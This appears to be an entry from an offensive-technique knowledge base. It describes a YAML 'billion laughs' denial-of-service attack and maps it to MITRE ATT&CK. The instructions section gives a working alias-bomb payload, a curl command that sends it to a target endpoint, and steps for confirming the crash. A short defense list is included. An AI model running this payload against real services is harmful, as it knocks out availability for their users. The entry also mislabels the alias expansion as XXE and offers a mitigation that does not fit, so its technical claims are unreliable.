---
id: ae5767ce-f097-4f9f-ba3f-79649cd184c0
name: XXE-Denial-of-Service-via-YAML-Attack
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:44.292212+00:00'
updated_at: '2023-04-10T20:24:44.217935+00:00'
tactics:
  - '[[tactics/Impact|TA0040 - Impact]]'
techniques:
  - '[[techniques/Endpoint Denial of Service|T1499 - Endpoint Denial of Service]]'
sub_techniques:
  - >-
    [[techniques/Endpoint Denial of Service/Application or Service Denial of
    Service|T1499.001 - Application or Service Denial of Service]]
tags:
  - xxe
  - yaml
  - denial-of-service
  - dos
  - xml-external-entity
commands:
  - '[[commands/curl-post-yaml-payload]]'
platforms:
  - Web
tools: []
validated: true
---

# XXE-Denial-of-Service-via-YAML-Attack

## Summary

This procedure exploits an XML External Entity (XXE) vulnerability in YAML parsers to perform a denial-of-service (DoS) attack by crafting a malicious YAML payload that creates exponentially expanding data structures, leading to memory exhaustion and application crash on the target system.

## Description

The attack leverages YAML's anchor and alias features to implement a "billion laughs" style DoS, similar to XML bomb attacks but adapted for YAML processing. When a vulnerable application parses the crafted YAML input without proper entity expansion limits, it recursively expands references, consuming excessive memory and CPU resources until the process becomes unresponsive or crashes. This is particularly effective against web applications or APIs that accept YAML uploads or configurations from untrusted sources. The technique targets parsers like PyYAML or those in Java/Spring frameworks that mishandle external entities. Success disrupts service availability, potentially affecting multiple users or backend systems.

## Requirements

1. A target application vulnerable to XXE in YAML processing (e.g., no entity expansion disabled).
2. Network access to the endpoint accepting YAML input (e.g., via HTTP POST).
3. Tools for crafting and sending the payload, such as curl or a proxy like Burp Suite.
4. Knowledge of the target's YAML ingestion endpoint (e.g., /upload or /config).

## Defense

- Disable external entity processing in YAML parsers (e.g., set PyYAML's safe_load or equivalent).
- Implement input size limits and entity expansion depth restrictions.
- Use web application firewalls (WAFs) to detect recursive YAML patterns or large payloads.
- Validate and sanitize all YAML inputs, rejecting anchors/aliases from untrusted sources.
- Monitor for sudden memory spikes or parser errors in application logs.

## Objectives

1. Cause memory exhaustion on the target application to render it unresponsive.
2. Disrupt availability of services relying on YAML parsing.
3. Demonstrate impact of unpatched XXE vulnerabilities in configuration or data ingestion flows.

## Instructions

### Step 1: Craft the Malicious YAML Payload

**Context**: Create the DoS payload using YAML anchors to define a base list and recursively reference it with aliases, leading to exponential expansion (e.g., 9 levels deep results in billions of elements).

**Code** ([[codes/YAML-Billion-Laughs-DoS-Payload]]):

```yaml
a: &a ["lol","lol","lol","lol","lol","lol","lol","lol","lol"]
b: &b [*a,*a,*a,*a,*a,*a,*a,*a,*a]
c: &c [*b,*b,*b,*b,*b,*b,*b,*b,*b]
d: &d [*c,*c,*c,*c,*c,*c,*c,*c,*c]
e: &e [*d,*d,*d,*d,*d,*d,*d,*d,*d]
f: &f [*e,*e,*e,*e,*e,*e,*e,*e,*e]
g: &g [*f,*f,*f,*f,*f,*f,*f,*f,*f]
h: &h [*g,*g,*g,*g,*g,*g,*g,*g,*g]
i: &i [*h,*h,*h,*h,*h,*h,*h,*h,*h]
```

> Save this as a file named malicious.yaml. The structure starts with a small list in 'a' and each subsequent list references the previous one 9 times, causing massive expansion during parsing (e.g., list 'i' expands to ~387 million elements).

### Step 2: Send the Payload to the Target Endpoint

**Context**: Deliver the crafted YAML to the vulnerable endpoint via HTTP POST, mimicking legitimate input to trigger parsing and entity expansion.

**Command** ([[commands/curl-post-yaml-payload]]):

```bash
curl -X POST -H "Content-Type: application/x-yaml" --data-binary @malicious.yaml $_TARGET_URL
```

> This sends the YAML file to the target URL. Replace $_TARGET_URL with the actual endpoint (e.g., http://target.com/api/config). Use --data-binary to preserve YAML formatting. If authentication is required, add -H "Authorization: Bearer $_TOKEN".

### Step 3: Verify the DoS Impact

**Context**: Monitor the target for signs of disruption, such as timeouts, errors, or resource exhaustion, confirming the attack success.

**Instructions**: After sending, attempt to access the application normally (e.g., via browser or repeated curl requests). Check server logs if accessible for out-of-memory errors or high CPU usage.

> Expected signs include application crashes, 500 errors, or complete unresponsiveness. If the parser limits expansion, the attack may fail—test on a local vulnerable setup first.
